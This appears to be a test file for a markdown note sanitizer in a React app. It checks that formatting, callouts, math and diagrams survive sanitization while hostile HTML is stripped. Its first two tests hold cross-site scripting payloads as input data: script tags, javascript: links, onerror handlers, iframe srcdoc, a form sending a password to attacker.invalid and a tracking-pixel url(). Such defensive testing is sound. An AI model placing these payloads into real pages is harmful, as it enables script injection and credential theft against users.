import assert from "node:assert/strict";
import { test } from "node:test";
import React from "react";
import { renderToStaticMarkup } from "react-dom/server";
import Markdown, { defaultUrlTransform } from "react-markdown";
import raw from "rehype-raw";
import katex from "rehype-katex";
import gfm from "remark-gfm";
import math from "remark-math";
import { rehypeNoteSanitize } from "../src/editor/noteSanitize.js";
import { remarkCallouts } from "../src/editor/callouts.js";
import { remarkDiagrams } from "../src/shared/lib/diagramMarkdown.js";

const render = (text) => renderToStaticMarkup(React.createElement(Markdown, {
  remarkPlugins: [gfm, math, remarkCallouts, remarkDiagrams],
  rehypePlugins: [raw, rehypeNoteSanitize, katex],
  urlTransform: (url) => /^(blockref|blockembed|unlinked|mention):/.test(url) ? url : defaultUrlTransform(url),
}, text));

test("untrusted notes cannot create executable documents or global styles", () => {
  const html = render(`<iframe srcdoc="<script>parent.__probe=1</script>"></iframe>
<object data="/api/uploads/payload.html"></object><embed src="/api/uploads/payload.html">
<script>alert(1)</script><style>body{display:none}</style>
<svg><foreignObject><iframe srcdoc="payload"></iframe></foreignObject></svg>
<form action="https://attacker.invalid/"><input name="password"></form>
<a href="javascript:alert(1)" onclick="alert(1)">link</a>
<img src="x" onerror="alert(1)">
<span id="location" class="appOverlay" style="position:fixed;inset:0">safe text</span>`);
  assert.doesNotMatch(html, /iframe|srcdoc|object|embed|<script|<style|<svg|foreignObject|<form|password|javascript:|onclick|onerror|position:|appOverlay/i);
  assert.match(html, /safe text/);
  assert.match(html, /id="user-content-location"/, "IDs cannot clobber browser globals");
});

test("color spans keep colors while removing URL loads and layout styles", () => {
  const html = render('<span style="color:#e5484d;background:#e5484d55;position:fixed">colored</span>' +
    '<span style="background:url(https://attacker.invalid/pixel);color:rgb(1, 2, 3)">rgb</span>' +
    '<span style="color:var(--secret);background:expression(alert(1))">plain</span>');
  assert.match(html, /color:#e5484d;background-color:#e5484d55/);
  assert.match(html, /color:rgb\(1, 2, 3\)/);
  assert.doesNotMatch(html, /url\(|attacker|position|var\(|expression/);
});

test("formatting, task lists, tables, callouts, Gamma links and math survive", () => {
  const html = render(`> [!tip]+ Fold title
> body with <u>underlined</u> and <mark>marked</mark> text

- [x] done

| A | B |
| - | - |
| one | two |

[ref](blockref:abc) [embed](blockembed:def) [new](unlinked:title) [person](mention:user)

$x^2$`);
  assert.match(html, /<details class="callout callout-tip calloutFold" open="">/);
  assert.match(html, /<summary class="calloutTitle">Fold title/);
  assert.match(html, /<u>underlined<\/u>/);
  assert.match(html, /<mark>marked<\/mark>/);
  assert.match(html, /type="checkbox"[^>]*checked=""/);
  assert.match(html, /<table>/);
  for (const href of ["blockref:abc", "blockembed:def", "unlinked:title", "mention:user"]) assert.ok(html.includes(`href="${href}"`));
  assert.match(html, /class="katex"/);
  assert.match(html, /<math /, "KaTeX renders after sanitization");
});

test("diagram metadata, image sizes and language classes survive", () => {
  const html = render('```mermaid width=420\ngraph TD; A-->B\n```\n\n<img src="/api/uploads/image.png" width="320">\n\n```js\nconst x = 1;\n```');
  assert.match(html, /data-diagram-kind="mermaid"/);
  assert.match(html, /data-diagram-pending="false"/);
  assert.match(html, /data-diagram-width="420"/);
  assert.match(html, /width="320"/);
  assert.match(html, /class="language-js"/);
});
